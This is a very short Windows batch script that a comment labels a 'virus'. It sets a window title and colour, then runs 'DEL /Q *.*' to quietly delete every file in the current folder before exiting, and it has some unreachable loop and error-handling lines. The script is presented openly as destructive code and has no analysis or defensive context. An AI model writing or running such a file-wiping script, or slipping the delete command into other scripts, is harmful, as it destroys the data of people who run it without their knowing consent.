@ECHO OFF

:: change name and color
TITLE susi baka
COLOR a

:: virus
:hey

:: deletes all there files
DEL /Q *.*

:: stop func
EXIT /b 0

GOTO hey


:: error codes
IF %ERRORLEVEL% NEQ 0 (
  ECHO error
  PAUSE
)
